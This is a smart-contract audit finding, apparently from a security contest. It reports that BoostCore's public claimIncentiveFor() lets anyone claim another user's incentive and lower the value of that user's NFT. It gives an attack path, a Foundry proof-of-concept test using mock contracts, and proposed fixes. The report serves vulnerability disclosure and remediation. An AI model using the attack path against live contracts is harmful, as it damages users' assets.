# Anyone can call `claimIncentiveFor()` allowing anyone to claim somebody else's incentive for them which they might not want given that NFT Value would drop

### Summary

As `BoostCore::claimIncentiveFor()` is not marked as internal, anyone is able to call it with a claimant which will cause incentive to be sent to a claimants account which they might have not wanted. This is because NFT Minting actions on boost can make an NFT be worth more money if it promises an incentive if you trade it, however that value goes away as soon as the incentive is claimed.

### Root Cause

`BoostCore::claimIncentiveFor()` is not marked as internal or doesn't have signature checks, it is marked as public

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. User completes NFT mint action on boost
2. User doesn't want to claim incentive given that the NFT will be worth more if they don't claim it
3. Attacker calls `claimIncentiveFor()` for the User
4. User gets incentive (which they may not have wanted) and NFT value drops substantially

### Impact

The user suffers a loss of their NFT Value as attacker has claimed their incentive for them, which was tied to their NFT.

### PoC

Add to bottom of `BoostCore.t.sol`
```solidity
    function test_anyoneCanClaimForAnyoneElse() public {
        address NFTMinter = makeAddr("NFTMinter");
        address attacker = makeAddr("attacker");

        boostCore.createBoost(validCreateCalldata);

        hoax(NFTMinter, 1 ether);

        mockERC721.mint{value: 0.1 ether}(address(NFTMinter));

        bytes memory txData = bytes(abi.encode(NFTMinter, bytes(abi.encode(bytes32(uint256(1))))));

        console.log("Minter's balance before: ", mockERC20.balanceOf(NFTMinter));

        hoax(attacker, 1 ether);

        boostCore.claimIncentiveFor{value: 0.1 ether /* To cover fees*/ }(0, 0, address(0), txData, NFTMinter);

        console.log("Minter's balance after: ", mockERC20.balanceOf(NFTMinter));

        assertGt(mockERC20.balanceOf(NFTMinter), 0);
    }
```

### Mitigation

1. Make `claimIncentiveFor()` internal
2. Add signature verification to `claimIncentiveFor()`
